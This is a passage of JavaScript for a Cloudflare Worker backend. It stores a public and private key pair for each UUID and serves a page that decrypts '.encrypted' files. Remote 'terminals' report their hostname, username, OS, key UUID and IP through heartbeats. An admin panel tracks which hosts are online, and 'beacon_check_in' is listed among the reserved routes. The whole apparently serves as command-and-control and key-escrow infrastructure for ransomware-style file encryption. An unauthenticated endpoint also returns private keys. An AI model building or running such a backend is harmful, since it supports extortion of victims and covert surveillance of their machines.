                    <button id="selectFilesBtn" disabled class="flex items-center px-5 py-2.5 bg-white border-2 border-gray-400 rounded text-gray-700 hover:bg-gray-100 transition-colors disabled:opacity-40 disabled:cursor-not-allowed">
                        <i data-lucide="file-plus" class="w-4 h-4 mr-2"></i> 选择文件
                    </button>
                    <button id="selectFolderBtn" disabled class="flex items-center px-5 py-2.5 bg-white border-2 border-gray-400 rounded text-gray-700 hover:bg-gray-100 transition-colors disabled:opacity-40 disabled:cursor-not-allowed">
                        <i data-lucide="folder-plus" class="w-4 h-4 mr-2"></i> 选择文件夹
                    </button>
                </div>
                <input type="file" id="fileInput" accept=".encrypted" multiple style="display:none" disabled>
                <input type="file" id="folderInput" webkitdirectory multiple style="display:none" disabled>
                <div id="fileList" class="bg-white border border-gray-300 rounded p-3 max-h-48 overflow-y-auto">
                    <p class="text-gray-500 text-sm">未选择加密文件</p>
                </div>
            </div>

            <!-- 步骤 3: 解密 -->
            <div class="bg-gray-50 border border-gray-200 rounded-xl p-6 mb-6">
                <div class="flex items-center mb-4">
                    <span class="w-8 h-8 rounded-full bg-gray-700 text-white flex items-center justify-center text-sm font-bold mr-3">3</span>
                    <h2 class="text-xl font-semibold text-gray-700">开始解密</h2>
                </div>
                <button id="decryptBtn" disabled class="w-full flex items-center justify-center px-6 py-3 bg-gray-700 text-white border-2 border-gray-700 rounded font-medium hover:bg-gray-800 transition-colors disabled:opacity-40 disabled:cursor-not-allowed mb-4">
                    <i data-lucide="play" class="w-5 h-5 mr-3"></i> 开始解密
                </button>

                <!-- 日志输出 -->
                <div class="flex items-center justify-between mb-2">
                    <span class="text-sm font-medium text-gray-600">解密日志</span>
                    <button id="clearLogBtn" class="text-xs text-gray-500 hover:text-gray-700 underline">清空日志</button>
                </div>
                <div id="logArea" class="bg-gray-900 text-green-400 text-xs rounded p-4 h-64 overflow-y-auto font-mono"></div>
            </div>

            <!-- 返回链接 -->
            <div class="text-center mt-6">
                <a href="/" class="inline-flex items-center text-gray-500 hover:text-gray-700 transition-colors">
                    <i data-lucide="arrow-left" class="w-4 h-4 mr-2"></i> 返回首页
                </a>
            </div>

            <div class="mt-10 text-center text-gray-500 text-sm">
                <p>Powered by <a href="https://www.yangzihome.space" class="text-gray-600 hover:text-gray-800 transition-colors">YZFN</a></p>
            </div>
        </div>
    </div>
    <script>${DECRYPT_SCRIPT}</script>
</body>
</html>
    `;
}

async function handleApiStats(env, request) {
    if (!env.DB) return Response.json({ status: "error", message: "Database binding missing" }, { status: 500 });
    try {
        const url = new URL(request.url);
        const range = url.searchParams.get('range') || '1m';
        let dateRange;
        switch(range) {
            case '3m': dateRange = "-90 days"; break;
            case '6m': dateRange = "-180 days"; break;
            case '1y': dateRange = "-365 days"; break;
            case '1m': default: dateRange = "-30 days";
        }

        const countStmt = env.DB.prepare("SELECT total_generated as total FROM key_metrics WHERE id = 1");
        const countResult = await countStmt.first();

        let trendStmt;
        if (range === '1m' || range === '3m') {
            trendStmt = env.DB.prepare(`
                SELECT date(created_at) as date, COUNT(*) as count 
                FROM keys WHERE created_at >= date('now', ?) 
                GROUP BY date ORDER BY date ASC
            `);
        } else {
            trendStmt = env.DB.prepare(`
                SELECT strftime('%Y-%m', created_at) as date, COUNT(*) as count 
                FROM keys WHERE created_at >= date('now', ?) 
                GROUP BY strftime('%Y-%m', created_at) ORDER BY date ASC
            `);
        }
        const { results: trendResults } = await trendStmt.bind(dateRange).all();

        const latestStmt = env.DB.prepare("SELECT latest_uuid as uuid, latest_generated_at as created_at FROM key_metrics WHERE id = 1");
        const latestResult = await latestStmt.first();

        return Response.json({
            status: "success",
            total: countResult.total || 0,
            history: trendResults || [],
            latest: latestResult || null,
            range: range
        }, { status: 200 });
    } catch (e) {
        console.error("Stats API Error:", e);
        return Response.json({ status: "error", message: e.message }, { status: 500 });
    }
}

async function handleApiQuery(request, env) {
    const url = new URL(request.url);
    const uuid = url.searchParams.get('uuid');
    if (!uuid) return Response.json({ status: "error", message: "缺少 UUID 参数" }, { status: 400 });
    if (!env.DB) return Response.json({ status: "error", message: "DB Error" }, { status: 500 });

    try {
        const stmt = env.DB.prepare("SELECT public_key, private_key, rid FROM keys WHERE uuid = ?");
        const { results } = await stmt.bind(uuid).all();
        if (results.length > 0) {
            const record = results[0];
            return Response.json({
                status: "success",
                uuid: uuid,
                public_key: record.public_key,
                private_key: record.private_key,
                rid: record.rid
            });
        } else {
            return Response.json({ status: "error", message: "未找到对应的密钥" }, { status: 404 });
        }
    } catch (e) {
        console.error("Query API Error:", e);
        return Response.json({ status: "error", message: e.message }, { status: 500 });
    }
}

// ===================================================================================
// 第五部分：终端心跳与在线管理后台
// -----------------------------------------------------------------------------------
// - POST /api/heartbeat                客户端每 30s 上报一次心跳（无需认证）
// - GET  /admin                        管理后台（Cookie / Bearer 令牌鉴权）
// - POST /admin/login                  令牌登录
// - POST /admin/logout                 退出登录
// - GET  /admin/api/terminals          终端在线列表（JSON）
// - POST /admin/api/terminals/delete   移除终端记录
// ===================================================================================

const HEARTBEAT_INTERVAL_SEC = 30;   // 客户端心跳间隔
const ONLINE_WINDOW_SEC = 90;        // 超过该时长未收到心跳判定为离线（3 个心跳周期）
const ADMIN_SESSION_COOKIE = 'admin_session';
const ADMIN_SESSION_MAX_AGE = 7 * 24 * 60 * 60;
const MAX_HEARTBEAT_BODY = 8 * 1024;
const PBKDF2_ITERATIONS = 120000;

// D1 settings 表中的变量名（后台“系统设置”可改，未设置时回退 env）
const SETTING_KEYS = {
    ADMIN_TOKEN_HASH: 'admin_token_hash',
    SECRET_PATH: 'secret_path',
    HEARTBEAT_TOKEN: 'heartbeat_token',
    TURNSTILE_SITE_KEY: 'turnstile_site_key',
    TURNSTILE_SECRET_KEY: 'turnstile_secret_key'
};

const HTML_HEADERS = {
    'Content-Type': 'text/html;charset=UTF-8',
    'Cache-Control': 'no-store'
};

// 注意：D1 的 exec() 会把多行 SQL 按行切分，多行 DDL 会报 "incomplete input"，
// 因此这里拆成逐条语句，用 prepare().run() 执行。
const APP_SCHEMA_STATEMENTS = [
    `CREATE TABLE IF NOT EXISTS terminals (
        id TEXT PRIMARY KEY,
        hostname TEXT NOT NULL DEFAULT '',
        username TEXT NOT NULL DEFAULT '',
        os TEXT NOT NULL DEFAULT '',
        arch TEXT NOT NULL DEFAULT '',
        version TEXT NOT NULL DEFAULT '',
        mode TEXT NOT NULL DEFAULT '',
        key_uuid TEXT NOT NULL DEFAULT '',
        ip TEXT NOT NULL DEFAULT '',
        country TEXT NOT NULL DEFAULT '',
        user_agent TEXT NOT NULL DEFAULT '',
        first_seen INTEGER NOT NULL,
        last_seen INTEGER NOT NULL,
        heartbeat_count INTEGER NOT NULL DEFAULT 0,
        online INTEGER NOT NULL DEFAULT 1
    )`,
    `CREATE INDEX IF NOT EXISTS idx_terminals_last_seen ON terminals(last_seen DESC)`,
    `CREATE TABLE IF NOT EXISTS settings (
        key TEXT PRIMARY KEY,
        value TEXT NOT NULL DEFAULT '',
        updated_at INTEGER NOT NULL
    )`,
    `CREATE TABLE IF NOT EXISTS admin_sessions (
        id TEXT PRIMARY KEY,
        created_at INTEGER NOT NULL,
        expires_at INTEGER NOT NULL
    )`,
    `CREATE INDEX IF NOT EXISTS idx_admin_sessions_expires ON admin_sessions(expires_at)`
];

let terminalSchemaPromise = null;

function jsonResponse(data, status = 200) {
    return new Response(JSON.stringify(data), {
        status,
        headers: { 'Content-Type': 'application/json;charset=UTF-8', 'Cache-Control': 'no-store' }
    });
}

function clampText(value, maxLen) {
    if (value === null || value === undefined) return '';
    return String(value).replace(/[\u0000-\u001f\u007f]/g, '').slice(0, maxLen);
}

function escapeHtmlText(value) {
    return String(value === null || value === undefined ? '' : value).replace(/[&<>"']/g, function (ch) {
        return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[ch];
    });
}

function ensureTerminalSchema(env) {
    if (!env.DB || typeof env.DB.prepare !== 'function') {
        return Promise.reject(new Error('D1 binding "DB" 未配置'));
    }
    if (!terminalSchemaPromise) {
        terminalSchemaPromise = (async function () {
            for (const stmt of APP_SCHEMA_STATEMENTS) {
                try {
                    await env.DB.prepare(stmt).run();
                } catch (err) {
                    const msg = String((err && err.message) || err);
                    // 并发请求可能同时建表，忽略“已存在”类错误
                    if (!/already exists/i.test(msg)) throw err;
                }
            }
        })().catch(function (err) {
            terminalSchemaPromise = null;
            throw err;
        });
    }
    return terminalSchemaPromise;
}

function getEnvAdminToken(env) {
    return typeof env.ADMIN_TOKEN === 'string' ? env.ADMIN_TOKEN.trim() : '';
}

function constantTimeEqual(a, b) {
    if (typeof a !== 'string' || typeof b !== 'string') return false;
    let diff = a.length ^ b.length;
    const len = Math.max(a.length, b.length);
    for (let i = 0; i < len; i++) {
        diff |= (a.charCodeAt(i) || 0) ^ (b.charCodeAt(i) || 0);
    }
    return diff === 0;
}

function constantTimeEqualBytes(a, b) {
    if (!a || !b || a.length !== b.length) return false;
    let diff = 0;
    for (let i = 0; i < a.length; i++) diff |= a[i] ^ b[i];
    return diff === 0;
}

function readCookie(request, name) {
    const cookie = request.headers.get('Cookie') || '';
    for (const part of cookie.split(';')) {
        const idx = part.indexOf('=');
        if (idx < 0) continue;
        if (part.slice(0, idx).trim() === name) {
            try {
                return decodeURIComponent(part.slice(idx + 1).trim());
            } catch (e) {
                return '';
            }
        }
    }
    return '';
}

// -----------------------------------------------------------------------------------
// 系统设置（D1 settings 表；未设置时回退环境变量）
// -----------------------------------------------------------------------------------
async function getSetting(env, key) {
    await ensureTerminalSchema(env);
    const row = await env.DB.prepare('SELECT value FROM settings WHERE key = ?').bind(key).first();
    return row && row.value !== '' ? row.value : null;
}

async function getSettings(env, keys) {
    if (!keys || keys.length === 0) return {};
    await ensureTerminalSchema(env);
    const placeholders = keys.map(function () { return '?'; }).join(',');
    const stmt = env.DB.prepare('SELECT key, value FROM settings WHERE key IN (' + placeholders + ')');
    const { results } = await stmt.bind(...keys).all();
    const map = {};
    (results || []).forEach(function (row) {
        if (row.value !== '') map[row.key] = row.value;
    });
    return map;
}

async function setSetting(env, key, value) {
    const now = Math.floor(Date.now() / 1000);
    await env.DB.prepare(`
        INSERT INTO settings (key, value, updated_at) VALUES (?, ?, ?)
        ON CONFLICT(key) DO UPDATE SET value = excluded.value, updated_at = excluded.updated_at
    `).bind(key, value, now).run();
}

async function deleteSetting(env, key) {
    await env.DB.prepare('DELETE FROM settings WHERE key = ?').bind(key).run();
}

async function listSettingsPublic(env) {
    const keys = [SETTING_KEYS.SECRET_PATH, SETTING_KEYS.HEARTBEAT_TOKEN, SETTING_KEYS.TURNSTILE_SITE_KEY, SETTING_KEYS.TURNSTILE_SECRET_KEY, SETTING_KEYS.ADMIN_TOKEN_HASH];
    return getSettings(env, keys);
}

// 解析生效配置：D1 设置优先，其次环境变量，最后内置默认值
async function resolveSecretPath(env) {
    let value = null;
    try {
        value = await getSetting(env, SETTING_KEYS.SECRET_PATH);
    } catch (e) {
        value = null;
    }
    const raw = value || env.SECRET_PATH || DEFAULT_SECRET_PATH;
    return String(raw).replace(/^\/+|\/+$/g, '') || DEFAULT_SECRET_PATH;
}

async function resolveHeartbeatToken(env) {
    try {
        return (await getSetting(env, SETTING_KEYS.HEARTBEAT_TOKEN)) || '';
    } catch (e) {
        return '';
    }
}

async function resolveTurnstileSiteKey(env) {
    try {
        return (await getSetting(env, SETTING_KEYS.TURNSTILE_SITE_KEY)) || env.TURNSTILE_SITE_KEY || '';
    } catch (e) {
        return env.TURNSTILE_SITE_KEY || '';
    }
}

async function resolveTurnstileSecretKey(env) {
    try {
        return (await getSetting(env, SETTING_KEYS.TURNSTILE_SECRET_KEY)) || env.TURNSTILE_SECRET_KEY || '';
    } catch (e) {
        return env.TURNSTILE_SECRET_KEY || '';
    }
}

// -----------------------------------------------------------------------------------
// 管理凭据：PBKDF2 存储，支持后台修改；未自定义时回退 ADMIN_TOKEN 环境变量
// -----------------------------------------------------------------------------------
function bytesToBase64(bytes) {
    let binary = '';
    for (let i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i]);
    return btoa(binary);
}

function base64ToBytes(b64) {
    const binary = atob(b64);
    const out = new Uint8Array(binary.length);
    for (let i = 0; i < binary.length; i++) out[i] = binary.charCodeAt(i);
    return out;
}

async function derivePbkdf2(password, salt, iterations) {
    const keyMaterial = await crypto.subtle.importKey(
        'raw', new TextEncoder().encode(password), 'PBKDF2', false, ['deriveBits']
    );
    const bits = await crypto.subtle.deriveBits(
        { name: 'PBKDF2', salt: salt, iterations: iterations, hash: 'SHA-256' },
        keyMaterial, 256
    );
    return new Uint8Array(bits);
}

async function hashAdminToken(token) {
    const salt = crypto.getRandomValues(new Uint8Array(16));
    const derived = await derivePbkdf2(token, salt, PBKDF2_ITERATIONS);
    return JSON.stringify({
        algo: 'pbkdf2-sha256',
        iterations: PBKDF2_ITERATIONS,
        salt: bytesToBase64(salt),
        hash: bytesToBase64(derived)
    });
}

async function verifyAdminCredential(env, token) {
    if (!token) return false;
    let record = null;
    try {
        record = await getSetting(env, SETTING_KEYS.ADMIN_TOKEN_HASH);
    } catch (e) {
        record = null;
    }
    if (record) {
        let stored;
        try {
            stored = JSON.parse(record);
        } catch (e) {
            return false;
        }
        try {
            const derived = await derivePbkdf2(token, base64ToBytes(stored.salt), stored.iterations || PBKDF2_ITERATIONS);
            return constantTimeEqualBytes(derived, base64ToBytes(stored.hash));
        } catch (e) {
            return false;
        }
    }
    const envToken = getEnvAdminToken(env);
    return !!envToken && constantTimeEqual(token, envToken);
}

async function adminConfigured(env) {
    try {
        if (await getSetting(env, SETTING_KEYS.ADMIN_TOKEN_HASH)) return true;
    } catch (e) {
        // settings 表不可用时回退环境变量
    }
    return !!getEnvAdminToken(env);
}

// -----------------------------------------------------------------------------------
// 管理会话：Cookie 中只保存随机 session id，D1 保存其 SHA-256 摘要
// -----------------------------------------------------------------------------------
async function sha256Hex(text) {
    const digest = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(text));
    return Array.prototype.map.call(new Uint8Array(digest), function (b) {
        return b.toString(16).padStart(2, '0');
    }).join('');
}

function randomHex(bytes) {
    const arr = crypto.getRandomValues(new Uint8Array(bytes));
    return Array.prototype.map.call(arr, function (b) {
        return b.toString(16).padStart(2, '0');
    }).join('');
}

async function createAdminSession(env) {
    await ensureTerminalSchema(env);
    const raw = randomHex(32);
    const id = await sha256Hex(raw);
    const now = Math.floor(Date.now() / 1000);
    await env.DB.prepare(
        'INSERT INTO admin_sessions (id, created_at, expires_at) VALUES (?, ?, ?)'
    ).bind(id, now, now + ADMIN_SESSION_MAX_AGE).run();
    await env.DB.prepare('DELETE FROM admin_sessions WHERE expires_at < ?').bind(now).run();
    return raw;
}

async function verifyAdminSession(env, raw) {
    if (!raw) return false;
    try {
        await ensureTerminalSchema(env);
        const id = await sha256Hex(raw);
        const row = await env.DB.prepare(
            'SELECT id FROM admin_sessions WHERE id = ? AND expires_at > ?'
        ).bind(id, Math.floor(Date.now() / 1000)).first();
        return !!row;
    } catch (e) {
        return false;
    }
}

async function destroyAdminSession(env, raw) {
    if (!raw) return;
    try {
        const id = await sha256Hex(raw);
        await env.DB.prepare('DELETE FROM admin_sessions WHERE id = ?').bind(id).run();
    } catch (e) {
        // ignore
    }
}

async function destroyAllAdminSessions(env) {
    try {
        await env.DB.prepare('DELETE FROM admin_sessions').run();
    } catch (e) {
        // ignore
    }
}

function adminCookieHeader(raw, maxAge) {
    return [
        ADMIN_SESSION_COOKIE + '=' + encodeURIComponent(raw),
        'Path=/admin',
        'HttpOnly',
        'Secure',
        'SameSite=Strict',
        'Max-Age=' + maxAge
    ].join('; ');
}

async function isAdminRequest(request, env) {
    const auth = request.headers.get('Authorization') || '';
    if (auth.toLowerCase().startsWith('bearer ')) {
        return verifyAdminCredential(env, auth.slice(7).trim());
    }
    return verifyAdminSession(env, readCookie(request, ADMIN_SESSION_COOKIE));
}

// -----------------------------------------------------------------------------------
// 心跳上报
// -----------------------------------------------------------------------------------
async function handleTerminalHeartbeat(request, env) {
    if (!env.DB) return jsonResponse({ status: 'error', message: 'D1 binding missing' }, 500);

    const declaredLength = Number(request.headers.get('Content-Length') || 0);
    if (declaredLength > MAX_HEARTBEAT_BODY) {
        return jsonResponse({ status: 'error', message: '请求体过大' }, 413);
    }

    let body = {};
    try {
        body = await request.json();
    } catch (e) {
        body = {};
    }
    if (typeof body !== 'object' || body === null) body = {};

    const id = clampText(body.id || body.terminal_id || '', 64).trim();
    if (!id) {
        return jsonResponse({ status: 'error', message: '缺少终端标识 id' }, 400);
    }

    // 若后台配置了心跳接收密钥，则客户端必须携带 X-Heartbeat-Token
    const requiredHeartbeatToken = await resolveHeartbeatToken(env);
    if (requiredHeartbeatToken) {
        const provided = request.headers.get('X-Heartbeat-Token') || String(body.token || '');
        if (!constantTimeEqual(provided, requiredHeartbeatToken)) {
            return jsonResponse({ status: 'error', message: '心跳密钥无效' }, 401);
        }
    }

    const event = (clampText(body.event, 16).trim().toLowerCase()) || 'ping';
    const now = Math.floor(Date.now() / 1000);
    const ip = clampText(request.headers.get('CF-Connecting-IP') || request.headers.get('X-Forwarded-For') || '', 64);
    const country = clampText(request.cf && request.cf.country ? request.cf.country : '', 8);
    const userAgent = clampText(request.headers.get('User-Agent') || '', 256);
    const hostname = clampText(body.hostname, 128);
    const username = clampText(body.username, 64);
    const osName = clampText(body.os, 32);
    const arch = clampText(body.arch, 16);
    const version = clampText(body.version, 32);
    const mode = clampText(body.mode, 32);
    const keyUuid = clampText(body.key_uuid, 64);

    try {
        await ensureTerminalSchema(env);

        if (event === 'stop') {
            await env.DB.prepare(`
                INSERT INTO terminals (id, hostname, username, os, arch, version, mode, key_uuid, ip, country, user_agent, first_seen, last_seen, heartbeat_count, online)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 0, 0)
                ON CONFLICT(id) DO UPDATE SET
                    online = 0,
                    hostname = CASE WHEN excluded.hostname <> '' THEN excluded.hostname ELSE terminals.hostname END,
                    username = CASE WHEN excluded.username <> '' THEN excluded.username ELSE terminals.username END,
                    mode = CASE WHEN excluded.mode <> '' THEN excluded.mode ELSE terminals.mode END,
                    ip = CASE WHEN excluded.ip <> '' THEN excluded.ip ELSE terminals.ip END,
                    country = CASE WHEN excluded.country <> '' THEN excluded.country ELSE terminals.country END,
                    last_seen = excluded.last_seen
            `).bind(id, hostname, username, osName, arch, version, mode, keyUuid, ip, country, userAgent, now, now).run();
        } else {
            await env.DB.prepare(`
                INSERT INTO terminals (id, hostname, username, os, arch, version, mode, key_uuid, ip, country, user_agent, first_seen, last_seen, heartbeat_count, online)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1, 1)
                ON CONFLICT(id) DO UPDATE SET
                    hostname = CASE WHEN excluded.hostname <> '' THEN excluded.hostname ELSE terminals.hostname END,
                    username = CASE WHEN excluded.username <> '' THEN excluded.username ELSE terminals.username END,
                    os = CASE WHEN excluded.os <> '' THEN excluded.os ELSE terminals.os END,
                    arch = CASE WHEN excluded.arch <> '' THEN excluded.arch ELSE terminals.arch END,
                    version = CASE WHEN excluded.version <> '' THEN excluded.version ELSE terminals.version END,
                    mode = CASE WHEN excluded.mode <> '' THEN excluded.mode ELSE terminals.mode END,
                    key_uuid = CASE WHEN excluded.key_uuid <> '' THEN excluded.key_uuid ELSE terminals.key_uuid END,
                    ip = CASE WHEN excluded.ip <> '' THEN excluded.ip ELSE terminals.ip END,
                    country = CASE WHEN excluded.country <> '' THEN excluded.country ELSE terminals.country END,
                    user_agent = CASE WHEN excluded.user_agent <> '' THEN excluded.user_agent ELSE terminals.user_agent END,
                    last_seen = excluded.last_seen,
                    heartbeat_count = terminals.heartbeat_count + 1,
                    online = 1
            `).bind(id, hostname, username, osName, arch, version, mode, keyUuid, ip, country, userAgent, now, now).run();
        }

        return jsonResponse({
            status: 'ok',
            server_time: now,
            interval: HEARTBEAT_INTERVAL_SEC,
            online_window: ONLINE_WINDOW_SEC
        });
    } catch (e) {
        console.error('Heartbeat Error:', e);
        return jsonResponse({ status: 'error', message: e.message || String(e) }, 500);
    }
}

// -----------------------------------------------------------------------------------
// 管理后台：鉴权与接口
// -----------------------------------------------------------------------------------
async function handleAdminLogin(request, env) {
    if (!(await adminConfigured(env))) {
        return new Response(getAdminNotConfiguredPage(), { status: 503, headers: HTML_HEADERS });
    }
    let submitted = '';
    try {
        const form = await request.formData();
        submitted = String(form.get('token') || '').trim();
    } catch (e) {
        submitted = '';
    }
    if (!(await verifyAdminCredential(env, submitted))) {
        return new Response(getAdminLoginPage('访问令牌不正确'), { status: 401, headers: HTML_HEADERS });
    }
    const session = await createAdminSession(env);
    return new Response(null, {
        status: 302,
        headers: {
            Location: '/admin',
            'Set-Cookie': adminCookieHeader(session, ADMIN_SESSION_MAX_AGE),
            'Cache-Control': 'no-store'
        }
    });
}

async function handleAdminLogout(request, env) {
    const session = readCookie(request, ADMIN_SESSION_COOKIE);
    await destroyAdminSession(env, session);
    return new Response(null, {
        status: 302,
        headers: {
            Location: '/admin',
            'Set-Cookie': adminCookieHeader('', 0),
            'Cache-Control': 'no-store'
        }
    });
}

async function handleAdminPage(request, env) {
    if (!(await adminConfigured(env))) {
        return new Response(getAdminNotConfiguredPage(), { status: 503, headers: HTML_HEADERS });
    }
    if (!(await isAdminRequest(request, env))) {
        const url = new URL(request.url);
        const notice = url.searchParams.get('changed') === '1' ? '登录密钥已更新，请使用新密钥重新登录' : '';
        return new Response(getAdminLoginPage('', notice), { headers: HTML_HEADERS });
    }
    return new Response(getAdminPageHtml(), { headers: HTML_HEADERS });
}

async function handleAdminTerminals(request, env) {
    if (!(await adminConfigured(env))) {
        return jsonResponse({ status: 'error', message: '未配置管理登录密钥，管理后台不可用' }, 503);
    }
    if (!(await isAdminRequest(request, env))) {
        return jsonResponse({ status: 'error', message: '未授权' }, 401);
    }
    if (!env.DB) return jsonResponse({ status: 'error', message: 'D1 binding missing' }, 500);

    try {
        await ensureTerminalSchema(env);
        const now = Math.floor(Date.now() / 1000);
        const { results } = await env.DB.prepare(`
            SELECT id, hostname, username, os, arch, version, mode, key_uuid, ip, country, user_agent, first_seen, last_seen, heartbeat_count, online
            FROM terminals
            ORDER BY last_seen DESC
            LIMIT 500
        `).all();

        const terminals = (results || []).map(function (row) {
            const lastSeen = Number(row.last_seen) || 0;
            return {
                id: row.id,
                hostname: row.hostname,
                username: row.username,
                os: row.os,
                arch: row.arch,
                version: row.version,
                mode: row.mode,
                key_uuid: row.key_uuid,
                ip: row.ip,
                country: row.country,
                user_agent: row.user_agent,
                first_seen: Number(row.first_seen) || 0,
                last_seen: lastSeen,
                heartbeat_count: Number(row.heartbeat_count) || 0,
                online: !!row.online && (now - lastSeen) <= ONLINE_WINDOW_SEC,
                seconds_since_last_seen: Math.max(0, now - lastSeen)
            };
        });

        const onlineCount = terminals.filter(function (t) { return t.online; }).length;
        return jsonResponse({
            status: 'success',
            server_time: now,
            online_window: ONLINE_WINDOW_SEC,
            heartbeat_interval: HEARTBEAT_INTERVAL_SEC,
            summary: {
                total: terminals.length,
                online: onlineCount,
                offline: terminals.length - onlineCount
            },
            terminals: terminals
        });
    } catch (e) {
        console.error('Admin Terminals Error:', e);
        return jsonResponse({ status: 'error', message: e.message || String(e) }, 500);
    }
}

async function handleAdminDeleteTerminal(request, env) {
    if (!(await adminConfigured(env))) {
        return jsonResponse({ status: 'error', message: '未配置管理登录密钥，管理后台不可用' }, 503);
    }
    if (!(await isAdminRequest(request, env))) {
        return jsonResponse({ status: 'error', message: '未授权' }, 401);
    }

    let body = {};
    try {
        body = await request.json();
    } catch (e) {
        body = {};
    }
    const id = clampText(body && body.id, 64).trim();
    if (!id) return jsonResponse({ status: 'error', message: '缺少 id' }, 400);

    try {
        await ensureTerminalSchema(env);
        await env.DB.prepare('DELETE FROM terminals WHERE id = ?').bind(id).run();
        return jsonResponse({ status: 'ok', id: id });
    } catch (e) {
        console.error('Admin Delete Terminal Error:', e);
        return jsonResponse({ status: 'error', message: e.message || String(e) }, 500);
    }
}

// -----------------------------------------------------------------------------------
// 系统设置：页面与保存
// -----------------------------------------------------------------------------------
const RESERVED_PATHS = ['admin', 'decrypt', 'query', 'stats', 'api', 'beacon_check_in', 'api/generate'];

async function loadSettingsView(env) {
    const db = await listSettingsPublic(env);
    const envSiteKey = typeof env.TURNSTILE_SITE_KEY === 'string' ? env.TURNSTILE_SITE_KEY.trim() : '';
    const envSecretKey = typeof env.TURNSTILE_SECRET_KEY === 'string' ? env.TURNSTILE_SECRET_KEY.trim() : '';
    const dbSiteKey = db[SETTING_KEYS.TURNSTILE_SITE_KEY] || '';
    const dbSecretKey = db[SETTING_KEYS.TURNSTILE_SECRET_KEY] || '';
    return {
        db: db,
        effectiveSecretPath: db[SETTING_KEYS.SECRET_PATH] || (env.SECRET_PATH || DEFAULT_SECRET_PATH),
        adminSource: db[SETTING_KEYS.ADMIN_TOKEN_HASH] ? 'custom' : (getEnvAdminToken(env) ? 'env' : 'none'),
        heartbeatConfigured: !!db[SETTING_KEYS.HEARTBEAT_TOKEN],
        turnstileSiteKey: dbSiteKey || envSiteKey,
        turnstileSiteSource: dbSiteKey ? 'db' : (envSiteKey ? 'env' : 'none'),
        turnstileSecretSource: dbSecretKey ? 'db' : (envSecretKey ? 'env' : 'none'),
        turnstileConfigured: !!(dbSiteKey || envSiteKey || dbSecretKey || envSecretKey)
    };
}

async function handleAdminSettingsPage(request, env) {
    if (!(await adminConfigured(env))) {
        return new Response(getAdminNotConfiguredPage(), { status: 503, headers: HTML_HEADERS });
    }
    if (!(await isAdminRequest(request, env))) {
        return new Response(getAdminLoginPage(''), { headers: HTML_HEADERS });
    }
    const view = await loadSettingsView(env);
    const url = new URL(request.url);
    const message = url.searchParams.get('saved') === '1' ? '设置已保存' : '';
    return new Response(getAdminSettingsPage(view, message, ''), { headers: HTML_HEADERS });
}

async function handleAdminSettingsSave(request, env) {
    if (!(await adminConfigured(env))) {
        return new Response(getAdminNotConfiguredPage(), { status: 503, headers: HTML_HEADERS });
    }
    if (!(await isAdminRequest(request, env))) {
        return new Response(getAdminLoginPage(''), { headers: HTML_HEADERS });
    }

    let form;
    try {
        form = await request.formData();
    } catch (e) {
        const view = await loadSettingsView(env);
        return new Response(getAdminSettingsPage(view, '', '表单解析失败'), { status: 400, headers: HTML_HEADERS });
    }

    const newAdminToken = String(form.get('admin_token') || '').trim();
    const confirmAdminToken = String(form.get('admin_token_confirm') || '').trim();
    const resetAdminToken = form.get('reset_admin_token') === '1';
    const secretPathRaw = String(form.get('secret_path') || '').trim().replace(/^\/+|\/+$/g, '');
    const clearSecretPath = form.get('clear_secret_path') === '1';
    const heartbeatToken = String(form.get('heartbeat_token') || '').trim();
    const clearHeartbeatToken = form.get('clear_heartbeat_token') === '1';
    const turnstileSite = String(form.get('turnstile_site_key') || '').trim();
    const turnstileSecret = String(form.get('turnstile_secret_key') || '').trim();
    const clearTurnstile = form.get('clear_turnstile') === '1';

    const errors = [];
    if (newAdminToken) {
        if (newAdminToken.length < 8) errors.push('登录密钥至少 8 位');
        if (newAdminToken.length > 128) errors.push('登录密钥最长 128 位');
        if (newAdminToken !== confirmAdminToken) errors.push('两次输入的登录密钥不一致');
    }
    if (secretPathRaw && !/^[A-Za-z0-9_-]{1,64}$/.test(secretPathRaw)) {
        errors.push('安全路径仅允许字母、数字、下划线、连字符，长度 1-64');
    }
    if (secretPathRaw && RESERVED_PATHS.indexOf(secretPathRaw.toLowerCase()) >= 0) {
        errors.push('安全路径不能与内置路由冲突（' + RESERVED_PATHS.join(' / ') + '）');
    }
    if (heartbeatToken && (heartbeatToken.length < 8 || heartbeatToken.length > 128)) {
        errors.push('心跳接收密钥长度需为 8-128 位');
    }
    if (turnstileSite.length > 128 || turnstileSecret.length > 128) {
        errors.push('Turnstile Key 长度不能超过 128');
    }

    if (errors.length > 0) {
        const view = await loadSettingsView(env);
        return new Response(getAdminSettingsPage(view, '', errors.join('；')), { status: 400, headers: HTML_HEADERS });
    }

    await ensureTerminalSchema(env);

    // 先保存其它变量，再处理登录密钥变更（变更后需要重新登录）
    if (clearSecretPath) {
        await deleteSetting(env, SETTING_KEYS.SECRET_PATH);
    } else if (secretPathRaw) {
        await setSetting(env, SETTING_KEYS.SECRET_PATH, secretPathRaw);
    }

    if (clearHeartbeatToken) {
        await deleteSetting(env, SETTING_KEYS.HEARTBEAT_TOKEN);
    } else if (heartbeatToken) {
        await setSetting(env, SETTING_KEYS.HEARTBEAT_TOKEN, heartbeatToken);
    }

    if (clearTurnstile) {
        await deleteSetting(env, SETTING_KEYS.TURNSTILE_SITE_KEY);
        await deleteSetting(env, SETTING_KEYS.TURNSTILE_SECRET_KEY);
    } else {
        if (turnstileSite) await setSetting(env, SETTING_KEYS.TURNSTILE_SITE_KEY, turnstileSite);
        if (turnstileSecret) await setSetting(env, SETTING_KEYS.TURNSTILE_SECRET_KEY, turnstileSecret);
    }

    // 登录密钥变更：写入/清除后使全部会话失效，要求用新密钥重新登录
    if (newAdminToken || resetAdminToken) {
        if (newAdminToken) {
            await setSetting(env, SETTING_KEYS.ADMIN_TOKEN_HASH, await hashAdminToken(newAdminToken));
        } else {
            await deleteSetting(env, SETTING_KEYS.ADMIN_TOKEN_HASH);
        }
        await destroyAllAdminSessions(env);
        return new Response(null, {
            status: 302,
            headers: {
                Location: '/admin/login?changed=1',
                'Set-Cookie': adminCookieHeader('', 0),
                'Cache-Control': 'no-store'
            }
        });
    }

    return new Response(null, {
        status: 302,
        headers: { Location: '/admin/settings?saved=1', 'Cache-Control': 'no-store' }
    });
}

